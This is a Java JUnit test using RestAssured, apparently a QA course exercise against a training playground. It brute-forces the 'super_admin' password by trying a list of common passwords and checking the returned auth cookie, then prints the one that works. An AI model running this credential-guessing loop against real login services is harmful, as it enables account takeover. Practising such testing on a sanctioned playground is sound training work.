import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class PasswordHomeTest {
  @Test
  public void testGetPassword() throws InterruptedException {
    String login = "super_admin";
    String successfulMessage = "You are authorized";
    String failedMessage = "You are NOT authorized";
    String urlFirst = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
    String urlSecond = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
    String[] passwords = {"123456", "password", "123456789", "12345678", "qwerty", "adobe123[a]", "baseball", "trustno1",
            "qwerty123", "iloveyou", "1234567", "1234567890", "1q2w3e4r", "666666", "photoshop[a]", "111111",
            "1qaz2wsx", "admin", "abc123", "1234", "mustang", "121212", "starwars", "bailey", "access", "flower",
            "555555", "monkey", "lovely", "shadow", "ashley", "sunshine", "letmein", "dragon", "passw0rd",
            "7777777", "123123", "football", "12345", "michael", "login", "!@#$%^&*", "welcome", "654321",
            "jesus", "password1", "master", "hello", "charlie", "888888", "superman", "696969", "qwertyuiop",
            "hottie", "freedom", "aa123456", "princess", "qazwsx", "ninja", "azerty", "solo", "loveme", "whatever",
            "donald", "batman", "zaq1zaq1", "Football", "000000"};
    for (String password : passwords) {
      Map<String, String> data = new HashMap<>();
      data.put("login", login);
      data.put("password", password);
      Response responseForGet = RestAssured
              .given()
              .body(data)
              .when()
              .post(urlFirst)
              .andReturn();
      String responseCookie = responseForGet.getCookie("auth_cookie");

      Map<String, String> cookies = new HashMap<>();
      if (responseCookie != null) {
        cookies.put("auth_cookie", responseCookie);
      }

      Response responseForCheck = RestAssured
              .given()
              .cookies(cookies)
              .when()
              .post(urlSecond)
              .andReturn();
      if (responseForCheck.asString().equals(successfulMessage)) {
        System.out.println("Password:" + password);
        System.out.println("Cookies:" + responseCookie);
        break;
      }

    }
  }
}